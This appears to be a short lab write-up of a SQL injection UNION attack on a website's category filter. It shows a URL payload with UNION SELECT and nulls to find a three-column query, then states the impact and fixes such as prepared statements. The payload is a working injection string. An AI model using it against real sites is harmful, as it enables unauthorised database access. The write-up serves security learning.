# Lab: SQL Injection UNION Attack

## Summary

The website has a SQL Injection vulnerability in the category filter.

I used a `UNION SELECT` payload to find the number of columns in the SQL query.

## Steps

1. Go to any category page.
2. The original URL is:
```text
/filter?category=Corporate+gifts
```
3. Change the URL to:
```text
/filter?category=Corporate+gifts'+UNION+SELECT+null,null,null--+-
```
4. The page loads successfully.
5. This shows that the SQL query has **3 columns**.

## Impact

An attacker may use SQL Injection to access data from the database.

## Fix

- Use prepared statements.
- Use parameterized queries.
- Do not put user input directly into SQL queries.
